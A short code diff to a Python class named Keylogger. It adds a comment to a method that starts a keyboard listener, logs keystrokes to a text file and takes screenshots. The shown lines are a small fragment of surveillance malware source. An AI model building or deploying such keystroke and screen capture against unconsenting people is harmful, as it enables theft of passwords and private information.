@@ -100,6 +100,7 @@ class Keylogger:
 	def start_listening(self):
 		with keyboard.Listener(
 			on_press=self.on_press) as listener:
+			# begin logging to txt file
 			self.log_to_file()
 			# begin taking screen shots
 			self.save_screen()
